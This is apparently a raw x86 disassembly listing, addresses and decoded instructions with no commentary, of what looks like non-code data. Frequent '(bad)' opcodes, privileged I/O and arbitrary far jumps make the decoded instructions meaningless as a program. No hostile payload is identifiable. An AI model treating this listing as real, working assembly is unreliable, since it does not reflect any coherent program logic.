  41ac9b:	adc    DWORD PTR [ebx],esp
  41ac9d:	adc    al,0x86
  41ac9f:	test   eax,0x4cfb1698
  41aca4:	sbb    eax,0x89d06d38
  41aca9:	mov    ds:0x4265c89a,al
  41acae:	push   edi
  41acaf:	adc    DWORD PTR [esi+0x4d7a4b93],0x4a475ade
  41acb9:	aad    0x9d
  41acbb:	mov    bl,0x67
  41acbd:	mov    BYTE PTR [eax+edx*4-0x18],cl
  41acc1:	in     eax,0x40
  41acc3:	pop    ecx
  41acc4:	mov    gs,WORD PTR [ebx-0x5e]
  41acc7:	or     cl,dl
  41acc9:	retf   
  41acca:	mov    bl,0xe
  41accc:	dec    edx
  41accd:	xlat   BYTE PTR ds:[ebx]
  41acce:	fcomp  DWORD PTR [eax+0x42]
  41acd1:	mov    ecx,0x131d5ebb
  41acd6:	sub    edi,esi
  41acd8:	pusha  
  41acd9:	sub    BYTE PTR [ebx-0x1b],ch
  41acdc:	stos   BYTE PTR es:[edi],al
  41acdd:	xor    al,cl
  41acdf:	imul   ecx,DWORD PTR [eax+0x49],0xfffffff1
  41ace3:	fs enter 0x1b45,0x4c
  41ace8:	xchg   ecx,eax
  41ace9:	cld    
  41acea:	pop    ss
  41aceb:	popf   
  41acec:	push   ebx
  41aced:	jle    0x41ad0c
  41acef:	add    al,0xf4
  41acf1:	js     0x41ad71
  41acf3:	lea    ebx,[edx+0xe]
  41acf6:	pop    ds
  41acf7:	fst    QWORD PTR [ebx]
  41acf9:	nop
  41acfa:	dec    edx
  41acfb:	mov    ds:0x8b41327f,al
  41ad00:	push   cs
  41ad01:	mov    WORD PTR [edx+0x34],ds
  41ad04:	jle    0x41ad39
  41ad06:	fadd   QWORD PTR [esi]
  41ad08:	cmc    
  41ad09:	push   ss
  41ad0a:	push   esp
  41ad0b:	ret    
  41ad0c:	iret   
  41ad0d:	inc    edi
  41ad0e:	cmp    al,0x8
  41ad10:	push   es
  41ad11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad12:	adc    eax,0x78702c0e
  41ad17:	jl     0x41ad49
  41ad19:	inc    ebx
  41ad1a:	sub    ebp,DWORD PTR [ebx+0x61408fad]
  41ad20:	push   cs
  41ad21:	xor    ah,ch
  41ad23:	in     eax,0xd9
  41ad25:	inc    ebx
  41ad26:	inc    edi
  41ad27:	test   al,0x16
  41ad29:	mov    al,0xf0
  41ad2b:	pop    esp
  41ad2c:	ins    DWORD PTR es:[edi],dx
  41ad2d:	sbb    BYTE PTR [eax+0x3ea300a7],dl
  41ad33:	(bad)  
  41ad34:	xchg   ebp,eax
  41ad35:	mov    al,ds:0x5ca76a88
  41ad3a:	(bad)  
  41ad3b:	dec    ebp
  41ad3c:	xor    ebp,DWORD PTR [edx]
  41ad3e:	mov    DWORD PTR [edx+0x9270ba0],ebx
  41ad44:	cmp    ch,0x9f
  41ad47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad48:	fistp  QWORD PTR ds:0x65f6ab88
  41ad4e:	or     DWORD PTR [ecx+0x27],ebx
  41ad51:	mov    edi,0x774da315
  41ad56:	add    eax,0xd1857cc6
  41ad5b:	pop    eax
  41ad5c:	xchg   ebp,eax
  41ad5d:	pop    eax
  41ad5e:	je     0x41ad4a
  41ad60:	mov    edx,esp
  41ad62:	fbstp  TBYTE PTR [edi+0x37]
  41ad65:	ins    BYTE PTR es:[edi],dx
  41ad66:	add    eax,0x77c58d61
  41ad6b:	outs   dx,DWORD PTR ds:[esi]
  41ad6c:	jnp    0x41ad78
  41ad6e:	cmp    al,BYTE PTR [edx-0x28]
  41ad71:	mov    WORD PTR [edi],ss
  41ad73:	aaa    
  41ad74:	sub    esp,ecx
  41ad76:	jae    0x41ad1d
  41ad78:	rol    DWORD PTR [ebx+0x17],1
  41ad7b:	test   eax,0xc894b107
  41ad80:	add    DWORD PTR [ecx+eiz*2-0x53],ebx
  41ad84:	adc    bh,BYTE PTR [esi]
  41ad86:	(bad)  
  41ad87:	xor    bh,dh
  41ad89:	stos   DWORD PTR es:[edi],eax
  41ad8a:	mov    al,0x78
  41ad8c:	ds in  eax,dx
  41ad8e:	(bad)  
  41ad8f:	rol    BYTE PTR [eax],1
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [esp+edi*8+0x466d782],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	std    
  41ae0d:	in     eax,0x6c
  41ae0f:	xor    al,0xbb
  41ae11:	dec    DWORD PTR [edi+0x5e1f787f]
  41ae17:	sbb    BYTE PTR [edi],0x78
  41ae1a:	adc    BYTE PTR [esi],0x34
  41ae1d:	xchg   ebx,eax
  41ae1e:	adc    ecx,eax
  41ae20:	xchg   BYTE PTR [ebx+0x4e],dh
  41ae23:	sub    al,0x34
  41ae25:	test   DWORD PTR [esi+0x6f70a879],0x113999c9
  41ae2f:	dec    edi
  41ae30:	jno    0x41ae87
  41ae32:	enter  0xe6aa,0xdb
  41ae36:	stos   DWORD PTR es:[edi],eax
  41ae37:	data16 fistp DWORD PTR [eax+esi*1]
  41ae3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae3c:	pop    ss
  41ae3d:	retf   0x6932
  41ae40:	or     eax,eax
  41ae42:	mov    ds:0xabbacc21,eax
  41ae47:	fs (bad) 
  41ae49:	mov    ah,0x3a
  41ae4b:	ret    0x2c41
  41ae4e:	ret    
  41ae4f:	mov    dh,0x22
  41ae51:	out    0xe2,al
  41ae53:	int3   
  41ae54:	lea    esi,[edi+0x12]
  41ae57:	jle    0x41ae9a
  41ae59:	cdq    
  41ae5a:	mov    al,ds:0x224f9fc1
  41ae5f:	fld    TBYTE PTR [eax+0x61f921c9]
  41ae65:	int    0x3a
  41ae67:	gs ret 
  41ae69:	test   edi,esp
  41ae6b:	or     dl,0x62
  41ae6e:	jmp    0x219c:0x730e0c37
  41ae75:	dec    edx
  41ae76:	daa    
  41ae77:	add    BYTE PTR [edi],dh
  41ae79:	mov    ecx,0xd1438028
  41ae7e:	push   0xffffff94
  41ae80:	fiadd  DWORD PTR [ecx-0x76]
  41ae83:	fcmovbe st,st(2)
  41ae85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae86:	fadd   st(6),st
  41ae88:	retf   
  41ae89:	fbld   TBYTE PTR [edx]
  41ae8b:	popa   
  41ae8c:	sub    al,0x78
  41ae8e:	popf   
  41ae8f:	lahf   
  41ae90:	xor    eax,0x328d1995
  41ae95:	mov    WORD PTR [eax+0x6e2ae1dd],fs
  41ae9b:	and    al,0xc4
  41ae9d:	lods   eax,DWORD PTR ds:[esi]
  41ae9e:	jne    0x41aec0
  41aea0:	push   edx
  41aea1:	aas    
  41aea2:	in     al,dx
  41aea3:	clc    
  41aea4:	imul   DWORD PTR [ebp-0x3f]
  41aea7:	(bad)  
  41aea8:	mov    ?,ebp
  41aeaa:	mov    eax,0xb0a27384
  41aeaf:	sub    esi,DWORD PTR [edi]
  41aeb1:	pusha  
  41aeb2:	sbb    BYTE PTR [eax+0x7cd74f4d],bh
  41aeb8:	lods   al,BYTE PTR ds:[esi]
  41aeb9:	(bad)  
  41aeba:	ds mov edx,0x4fe2cf1b
  41aec0:	push   ebp
  41aec1:	ins    DWORD PTR es:[edi],dx
  41aec2:	sbb    eax,0x136338eb
  41aec7:	adc    cl,BYTE PTR [ebp+0x74]
  41aeca:	push   ebx
  41aecb:	sub    esp,DWORD PTR [edx-0x19]
  41aece:	scas   al,BYTE PTR es:[edi]
  41aecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aed0:	or     BYTE PTR [ebx+0x3884c8d5],0xab
  41aed7:	cwde   
  41aed8:	or     BYTE PTR [eax],0xae
  41aedb:	or     dl,BYTE PTR [esi]
  41aedd:	pop    esi
  41aede:	or     DWORD PTR [ebp+0x72],ebx
  41aee1:	inc    eax
  41aee2:	jno    0x41aea8
  41aee4:	sbb    ecx,DWORD PTR [esi+edx*1-0x1e5d9bcf]
  41aeeb:	daa    
  41aeec:	repz and cl,al
  41aeef:	mov    eax,ds:0x2eed3700
  41aef4:	adc    dh,BYTE PTR es:[eax+esi*2]
  41aef8:	add    ebp,DWORD PTR [edi+0x3e9ed905]
  41aefe:	pop    ds
  41aeff:	hlt    
  41af00:	sub    ah,BYTE PTR [esi+esi*8+0x56]
  41af04:	lea    ecx,[ebx-0x5782f30a]
  41af0a:	pop    edx
  41af0b:	or     BYTE PTR [edi+0x2b],cl
  41af0e:	lods   al,BYTE PTR ds:[esi]
  41af0f:	adc    BYTE PTR [eax],al
	...
  41af71:	add    BYTE PTR [eax],al
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x549344ee
  41af82:	scas   eax,DWORD PTR es:[edi]
  41af83:	aas    
  41af84:	or     BYTE PTR [esi],bl
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	or     edx,DWORD PTR [ecx]
  41af8e:	jmp    0x1237:0x9542e920
  41af95:	push   ebx
  41af96:	dec    esp
  41af97:	inc    eax
  41af98:	push   ecx
  41af99:	inc    ebx
  41af9a:	adc    BYTE PTR [edi],cl
  41af9c:	push   esp
  41af9d:	scas   al,BYTE PTR es:[edi]
  41af9e:	and    al,0xcf
  41afa0:	in     eax,dx
  41afa1:	sti    
  41afa2:	mov    BYTE PTR [ebx-0x16],dl
  41afa5:	and    esp,ecx
  41afa7:	mov    ebx,0xf6a8a845
  41afac:	aad    0x43
  41afae:	inc    ebp
  41afaf:	inc    esp
  41afb0:	pop    ebp
  41afb1:	mov    DWORD PTR [ebp-0x2f],edi
  41afb4:	imul   edi,DWORD PTR [edx],0x59045fca
  41afba:	nop
  41afbb:	or     edi,DWORD PTR [esi-0x63a4c122]
  41afc1:	inc    esp
  41afc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afc3:	retf   0xf7e0
  41afc6:	dec    esi
  41afc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afc8:	or     ebp,DWORD PTR [edi]
  41afca:	sbb    bh,al
  41afcc:	bound  ecx,QWORD PTR [ecx-0x79b93830]
  41afd2:	jmp    FWORD PTR [edx+0x71]
  41afd5:	(bad)  
  41afd7:	fild   WORD PTR [edi-0x36]
  41afda:	mov    cs,WORD PTR [edx+0x23c8c2f6]
  41afe0:	inc    esi
  41afe1:	idiv   DWORD PTR [esi+0x40770464]
  41afe7:	lea    edx,[esp+ebp*8]
  41afea:	imul   edi,ebp,0xfffffffe
  41afed:	out    dx,eax
  41afee:	(bad)  
  41aff0:	mov    edi,0x6584ecc3
  41aff5:	inc    ebx
  41aff6:	jno    0x41b036
  41aff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aff9:	mov    dh,0x2c
  41affb:	into   
  41affc:	shr    BYTE PTR [ebp-0x3c6dbca],1
  41b002:	pusha  
  41b003:	jae    0x41b02d
  41b005:	inc    edx
  41b006:	dec    eax
  41b007:	pop    ebp
  41b008:	sti    
  41b009:	stc    
  41b00a:	int    0x8e
  41b00c:	push   0xba3f9c4b
  41b011:	mov    edi,0xb6932922
  41b016:	cmovbe ebp,DWORD PTR ds:0xe0221bf1
  41b01d:	and    dh,cl
  41b01f:	mov    ecx,0xeea9ee20
  41b024:	sub    al,0xac
  41b026:	push   eax
  41b027:	push   esp
  41b028:	add    eax,0x72d96a09
  41b02d:	div    DWORD PTR [edx]
  41b02f:	fsubr  DWORD PTR [ebp+0x4b34527]
  41b035:	icebp  
  41b036:	(bad)  
  41b037:	or     bl,BYTE PTR [eax-0x66]
  41b03a:	in     eax,dx
  41b03b:	pop    ebx
  41b03c:	mul    DWORD PTR [ebx+eax*1+0x4905cbc1]
  41b043:	and    ch,0x7f
  41b046:	test   ch,dl
  41b048:	lahf   
  41b049:	stc    
  41b04a:	add    BYTE PTR [ebx],al
  41b04c:	xchg   ecx,eax
  41b04d:	lds    edx,FWORD PTR [ecx+0x3388bbcb]
  41b053:	(bad)  
  41b054:	ds pop edi
  41b056:	mov    eax,ds:0x7fdf3c16
  41b05b:	cmp    BYTE PTR [esi-0x38],0x9c
  41b05f:	das    
  41b060:	cmp    BYTE PTR [ecx],dh
  41b062:	jns    0x41b06e
  41b064:	out    0xf1,al
  41b066:	and    bl,BYTE PTR [ebp+0x9535d2f]
  41b06c:	cmp    al,0x3f
  41b06e:	lods   eax,DWORD PTR ds:[esi]
  41b06f:	xor    BYTE PTR [edx-0x4b],bh
  41b072:	mov    ecx,0xed6c56fb
  41b077:	ja     0x41affb
  41b079:	ret    
  41b07a:	lock pop ebp
  41b07c:	dec    ecx
  41b07d:	lods   eax,DWORD PTR ds:[esi]
  41b07e:	shl    DWORD PTR [edx],cl
  41b080:	add    BYTE PTR [esi],0x14
  41b083:	add    al,0x3a
  41b085:	sub    dh,cl
  41b087:	add    al,0x96
  41b089:	fiadd  WORD PTR [edx+0x66]
  41b08c:	xor    cl,BYTE PTR [ecx]
  41b08e:	jmp    0x41b0d0
	...
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xa28661ce
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	ds mov BYTE PTR fs:[ebp-0x13c911e2],al
  41b114:	rcl    DWORD PTR [ebp+0x47],1
  41b117:	pop    ecx
  41b118:	xlat   BYTE PTR ds:[ebx]
  41b119:	cmp    edi,ebp
  41b11b:	lods   al,BYTE PTR es:[esi]
  41b11d:	fcom   QWORD PTR [ecx]
  41b11f:	sar    BYTE PTR [edi-0x68e35d56],1
  41b125:	adc    BYTE PTR [ecx],dh
  41b127:	mov    eax,0xdc863a80
  41b12c:	jnp    0x41b0c7
  41b12e:	xor    al,0x7a
  41b130:	xor    bh,BYTE PTR [ebx]
  41b132:	lods   eax,DWORD PTR ds:[esi]
  41b133:	mov    ds:0xb44d930f,al
  41b138:	cwde   
  41b139:	mov    esp,0x163f2f15
  41b13e:	sbb    dl,ch
  41b140:	cwde   
  41b141:	sbb    DWORD PTR [esi],ecx
  41b143:	mov    ebx,0x7bb41d22
  41b148:	mov    bh,0xc7
  41b14a:	and    al,0x51
  41b14c:	sbb    BYTE PTR [ecx+0xd743267],dl
  41b152:	inc    esi
  41b153:	or     esp,esi
  41b155:	bound  ebx,QWORD PTR [ecx+0x393b7d1d]
  41b15b:	or     al,0xc1
  41b15d:	jle    0x41b1de
  41b15f:	mov    bl,0xaa
  41b161:	(bad)  
  41b162:	jg     0x41b1b0
  41b164:	loop   0x41b115
  41b166:	push   0xffffffe0
  41b168:	mov    cl,0xc3
  41b16a:	dec    ebx
  41b16b:	adc    eax,0xeaf2c6e4
  41b170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b171:	mov    ch,0x62
  41b173:	fsubp  st(1),st
  41b175:	into   
  41b176:	pop    edi
  41b177:	mov    bl,0xd
  41b179:	and    DWORD PTR [eax],0x88dee177
  41b17f:	jge    0x41b151
  41b181:	push   ebp
  41b182:	jmp    0x98183d91
  41b187:	stos   DWORD PTR es:[edi],eax
  41b188:	xchg   esp,eax
  41b189:	(bad)  [edi+0x33]
  41b18c:	jg     0x41b111
  41b18e:	xchg   esi,eax
  41b18f:	cdq    
  41b190:	or     al,0x51
  41b192:	push   cs
  41b193:	cld    
  41b194:	mov    edi,0xad5735b5
  41b199:	mov    esp,ebx
  41b19b:	out    dx,eax
  41b19c:	sbb    dh,bh
  41b19e:	mov    eax,ds:0x35039500
  41b1a3:	loope  0x41b16c
  41b1a5:	addr16 js 0x41b15c
  41b1a8:	mov    WORD PTR [eax-0x42],gs
  41b1ab:	mov    edx,0x5b01ebde
  41b1b0:	je     0x41b15c
  41b1b2:	(bad)  
  41b1b3:	ss (bad) 
  41b1b5:	xor    al,0xeb
  41b1b7:	in     eax,dx
  41b1b8:	ja     0x41b20f
  41b1ba:	pusha  
  41b1bb:	jge    0x41b199
  41b1bd:	inc    ecx
  41b1be:	add    edi,DWORD PTR ds:0xc2913c03
  41b1c4:	popa   
  41b1c5:	not    BYTE PTR [eax]
  41b1c7:	(bad)  
  41b1c8:	xlat   BYTE PTR ds:[ebx]
  41b1c9:	xor    eax,0x7af4e89c
  41b1ce:	push   cs
  41b1cf:	sub    eax,0x51acc36c
  41b1d4:	outs   dx,BYTE PTR ds:[esi]
  41b1d5:	or     eax,0x728bd25a
  41b1da:	lods   eax,DWORD PTR ds:[esi]
  41b1db:	out    dx,al
  41b1dc:	lods   eax,DWORD PTR ds:[esi]
  41b1dd:	adc    esi,DWORD PTR [ecx]
  41b1df:	pop    ebp
  41b1e0:	lea    ebp,gs:[eax]
  41b1e3:	clc    
  41b1e4:	(bad)  
  41b1e5:	xchg   esi,eax
  41b1e6:	xor    al,0x1
  41b1e8:	repnz or al,0xa2
  41b1eb:	ss push ss
  41b1ed:	mov    bh,0x8d
  41b1ef:	sub    al,0xed
  41b1f1:	push   0xffffffa1
  41b1f3:	adc    eax,0xfdd58e85
  41b1f8:	pop    edi
  41b1f9:	test   al,0x2f
  41b1fb:	xlat   BYTE PTR ds:[ebx]
  41b1fc:	pop    ebp
  41b1fd:	into   
  41b1fe:	cmp    DWORD PTR [ebx],ebx
  41b200:	inc    ecx
  41b201:	out    dx,al
  41b202:	aam    0x60
  41b204:	adc    BYTE PTR [ebx+edx*8-0x3],bl
  41b208:	push   esi
  41b209:	jmp    0xc6ba:0x5025e6b3
	...
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ebx],ch
  41b281:	cli    
  41b282:	pop    esi
  41b283:	sub    DWORD PTR [eax],edx
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR [ecx+eax*1],al
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	les    ecx,FWORD PTR [ebx+0x59]
  41b28f:	aad    0x21
  41b291:	fidiv  WORD PTR [ebp-0x3a3857ea]
  41b297:	iret   
  41b298:	data16 and bl,0x1a
  41b29c:	js     0x41b286
  41b29e:	dec    eax
  41b29f:	dec    ecx
  41b2a0:	and    bl,al
  41b2a2:	sahf   
  41b2a3:	aas    
  41b2a4:	push   ss
  41b2a5:	jmp    0x41b289
  41b2a7:	sbb    BYTE PTR [ecx+ebx*8-0x59619c99],bl
  41b2ae:	xchg   edi,eax
  41b2af:	and    cl,0x5a
  41b2b2:	(bad)  
  41b2b3:	sar    DWORD PTR [edx*8+0x408f389f],0x7b
  41b2bb:	(bad)  
  41b2bc:	pop    ss
  41b2bd:	mov    al,0x45
  41b2bf:	jbe    0x41b2f9
  41b2c1:	(bad)  [ebp*2+0x54db80de]
  41b2c8:	outs   dx,BYTE PTR ds:[esi]
  41b2c9:	pop    eax
  41b2ca:	adc    DWORD PTR [edx+0x65],esi
  41b2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2ce:	jae    0x41b2dd
  41b2d0:	inc    ebx
  41b2d1:	in     eax,dx
  41b2d2:	les    esi,FWORD PTR [ebp+0x71]
  41b2d5:	nop
  41b2d6:	inc    ebx
  41b2d7:	(bad)  
  41b2d8:	mov    ecx,0x30544b42
  41b2dd:	or     al,0xda
  41b2df:	inc    ebp
  41b2e0:	sbb    eax,0x410f3cb2
  41b2e5:	scas   eax,DWORD PTR es:[edi]
  41b2e6:	sub    DWORD PTR [esi+0x2a],eax
  41b2e9:	in     al,0xde
  41b2eb:	dec    eax
  41b2ec:	sub    BYTE PTR [ecx],dl
  41b2ee:	addr16 and ecx,eax
  41b2f1:	cli    
  41b2f2:	mov    eax,ds:0x2c442efb
  41b2f7:	pop    esi
  41b2f8:	addr16 sbb esi,edx
  41b2fb:	mov    al,dh
  41b2fd:	push   ds
  41b2fe:	xor    esp,edx
  41b300:	or     DWORD PTR [ebx],0xf9b1bd4e
  41b306:	jg     0x41b2bd
  41b308:	mov    BYTE PTR [ebx-0x74],cl
  41b30b:	or     DWORD PTR [ebx+0x74e50be8],ebx
  41b311:	ret    0xf238
  41b314:	mov    ah,0xdb
  41b316:	inc    ebx
  41b317:	fistp  DWORD PTR [ebx]
  41b319:	mov    al,ds:0x822b6e5e
  41b31e:	jne    0x41b37a
  41b320:	push   0xbf5acb30
  41b325:	ret    
  41b326:	sub    BYTE PTR ds:0xd2042be4,dh
  41b32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b32d:	pop    ebp
  41b32e:	mov    eax,0xb1f0924e
  41b333:	pusha  
  41b334:	rol    DWORD PTR [ecx-0x3a],cl
  41b337:	xor    eax,0x7ec51c4b
  41b33c:	in     eax,dx
  41b33d:	into   
  41b33e:	enter  0x4413,0x61
  41b342:	or     DWORD PTR ds:0x87c254ec,0xffffff87
  41b349:	xsavec [esi+0x19]
  41b34d:	or     al,0x73
  41b34f:	sbb    DWORD PTR [edx-0x58294a5d],ebp
  41b355:	inc    eax
  41b356:	sti    
  41b357:	jle    0x41b36e
  41b359:	fsubr  DWORD PTR ds:0xef4ab345
  41b35f:	and    BYTE PTR [edx+eiz*1],0x62
  41b363:	clc    
  41b364:	jb     0x41b399
  41b366:	adc    al,0x9b
  41b368:	add    DWORD PTR [ecx],esp
  41b36a:	les    esi,FWORD PTR [ebx+0x6c]
  41b36d:	outs   dx,DWORD PTR ds:[si]
  41b36f:	xchg   esi,eax
  41b370:	ret    0xf49
  41b373:	rcl    BYTE PTR [ecx],0x27
  41b376:	inc    ebx
  41b377:	inc    edi
  41b378:	add    al,0xc4
  41b37a:	sbb    bh,BYTE PTR [ebx-0x40]
  41b37d:	cmp    BYTE PTR [ecx+0x3],al
  41b380:	xor    ecx,esp
  41b382:	sub    eax,0x833a8612
  41b387:	ret    
  41b388:	(bad)  
  41b389:	out    dx,al
  41b38a:	scas   al,BYTE PTR es:[edi]
  41b38b:	jmp    0x0:0x7acde81d
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	lea    eax,[ebx+0x5d]
  41b403:	outs   dx,DWORD PTR ds:[esi]
  41b404:	adc    al,0x21
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    al,0x1
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	pop    esi
  41b40d:	rol    DWORD PTR [ecx-0x60],0xf1
  41b411:	push   edi
  41b412:	adc    ch,BYTE PTR [edi+0x33]
  41b415:	addr16 jo 0x41b3f8
  41b418:	mov    bh,0x39
  41b41a:	mov    eax,0x63cfa008
  41b41f:	(bad)  
  41b420:	xor    ch,cl
  41b422:	xchg   esp,eax
  41b423:	pop    ecx
  41b424:	add    al,0xc9
  41b426:	pushf  
  41b427:	add    BYTE PTR [esi],dh
  41b429:	dec    edi
  41b42a:	fstp   TBYTE PTR [edx]
  41b42c:	ret    
  41b42d:	or     edx,esi
  41b42f:	mov    al,ds:0xdcb1cbcb
  41b434:	and    eax,0xf75a737b
  41b439:	in     al,dx
  41b43a:	jnp    0x41b3e5
  41b43c:	repnz mov ah,0x42
  41b43f:	sub    DWORD PTR [edi-0x3ba21d0b],ebx
  41b445:	sbb    eax,0x2b0b6eb1
  41b44a:	and    BYTE PTR [ebp-0x51c8007d],ah
  41b450:	js     0x41b468
  41b452:	shl    BYTE PTR [edx-0x4696c9ee],cl
  41b458:	push   es
  41b459:	or     DWORD PTR [ebx-0x37],edx
  41b45c:	popa   
  41b45d:	call   0xfc04:0xf8f565d3
  41b464:	sbb    al,BYTE PTR [esi+0x60]
  41b467:	test   al,0xc7
  41b469:	lea    esp,ds:0x6e1cc444
  41b46f:	pop    ebp
  41b470:	test   DWORD PTR [edx+eiz*2+0x14fb3b0f],eax
  41b477:	and    eax,DWORD PTR [edi]
  41b479:	outs   dx,BYTE PTR ds:[esi]
  41b47a:	xor    DWORD PTR [ebx-0x4f6ade9b],ebx
  41b480:	and    al,bl
  41b482:	repz ret 
  41b484:	int3   
  41b485:	add    esi,ecx
  41b487:	push   0xfffffffa
  41b489:	out    0xd3,al
  41b48b:	add    BYTE PTR [esi-0x27],0x8d
  41b48f:	pop    ss
  41b490:	cmp    DWORD PTR [edi-0xe],edx
  41b493:	mov    ds:0x4199db20,eax
  41b498:	mov    edx,0x2b58b0eb
  41b49d:	pop    ds
  41b49e:	adc    DWORD PTR [edi+eax*2-0x70c3cdd4],eax
  41b4a5:	push   0xfffffffe
  41b4a7:	and    al,0x52
  41b4a9:	mov    bh,0xa6
  41b4ab:	lea    edx,[edi+eiz*4]
  41b4ae:	or     dh,BYTE PTR [eax-0x4044d808]
  41b4b4:	dec    esp
  41b4b5:	inc    ebx
  41b4b6:	(bad)
  41b4ba:	and    bl,BYTE PTR [edi-0x13]
  41b4bd:	and    eax,0x4095e442
  41b4c2:	xor    eax,0xe38bf4e2
  41b4c7:	push   esp
  41b4c8:	popf   
  41b4c9:	xchg   esi,eax
  41b4ca:	add    eax,0x6ba6eeea
  41b4cf:	sti    
  41b4d0:	mov    esp,0xf1eed1fd
  41b4d5:	inc    edx
  41b4d6:	cmp    eax,0xe8ed3cdd
  41b4db:	fwait
  41b4dc:	xor    eax,0xa6e37017
  41b4e1:	adc    DWORD PTR [esi],edx
  41b4e3:	sbb    al,0x85
  41b4e5:	mov    ch,dh
  41b4e7:	xor    eax,0xd8f6fb03
  41b4ec:	push   0x5b5f81ec
  41b4f1:	jl     0x41b484
  41b4f3:	mov    bh,0xb3
  41b4f5:	fs or  eax,0x66284121
  41b4fb:	xor    BYTE PTR [ebp+0x1a5709bb],dh
  41b501:	(bad)  
  41b502:	(bad)  
  41b503:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b504:	add    eax,0x53970945
  41b509:	mov    dl,dh
  41b50b:	pop    edx
  41b50c:	adc    al,0xed
  41b50e:	retf   
  41b50f:	push   0x0
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	mov    ecx,0x18684f43
  41b585:	and    al,BYTE PTR [ecx]
  41b587:	add    BYTE PTR [ecx+eax*1],al
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	inc    ecx
  41b58d:	cld    
  41b58e:	mov    esi,0x7797f753
  41b593:	test   BYTE PTR [ecx-0x80],dl
  41b596:	dec    edi
  41b597:	(bad)  
  41b598:	out    dx,al
  41b599:	test   DWORD PTR [edi+eiz*4],eax
  41b59c:	(bad)  
  41b59d:	push   ss
  41b59e:	jmp    0x6e021442
  41b5a3:	sti    
  41b5a4:	add    al,0x6d
  41b5a6:	dec    edi
  41b5a7:	mov    ebp,DWORD PTR [ebx-0x2e437024]
  41b5ad:	pusha  
  41b5ae:	mov    eax,ds:0x792dd42c
  41b5b3:	push   0xffffffba
  41b5b5:	inc    ecx
  41b5b6:	cmp    ebp,ebp
  41b5b8:	cmp    eax,0x5e2d7d38
  41b5bd:	ins    BYTE PTR es:[edi],dx
  41b5be:	sar    BYTE PTR [ebp+0x7e],0x26
  41b5c2:	inc    esp
  41b5c3:	xchg   edi,eax
  41b5c4:	and    ebp,ebx
  41b5c6:	and    esp,edi
  41b5c8:	fidivr DWORD PTR [edx+0x4b4789d4]
  41b5ce:	adc    DWORD PTR [edx+0x52916747],esi
  41b5d4:	push   ecx
  41b5d5:	ja     0x41b5da
  41b5d7:	sbb    ch,bh
  41b5d9:	sbb    al,ah
  41b5db:	(bad)  
  41b5dc:	jecxz  0x41b634
  41b5de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5df:	mov    ecx,0xb18e23fc
  41b5e4:	mov    ah,0x59
  41b5e6:	(bad)  
  41b5e8:	pop    ebp
  41b5e9:	call   0xe354:0xb79cfa95
  41b5f0:	js     0x41b5b5
  41b5f2:	pop    ebx
  41b5f3:	fiadd  WORD PTR [edi]
  41b5f5:	bound  edi,QWORD PTR [ebp-0x45f9ee9a]
  41b5fb:	jae    0x41b5b4
  41b5fd:	cmp    ebp,DWORD PTR [eax]
  41b5ff:	sub    eax,0x5631037b
  41b604:	lods   eax,DWORD PTR ds:[esi]
  41b605:	int3   
  41b606:	jmp    0x41b65e
  41b608:	sti    
  41b609:	stos   BYTE PTR es:[edi],al
  41b60a:	in     al,dx
  41b60b:	mov    bl,0x2f
  41b60d:	sbb    al,0xb0
  41b60f:	int    0x4d
  41b611:	dec    esp
  41b612:	xor    eax,0x8d55151b
  41b617:	nop
  41b618:	xchg   ebp,eax
  41b619:	adc    al,0x68
  41b61b:	mov    al,ds:0xeebbca7f
  41b620:	or     bl,BYTE PTR [ebx]
  41b622:	pop    esi
  41b623:	ins    BYTE PTR es:[edi],dx
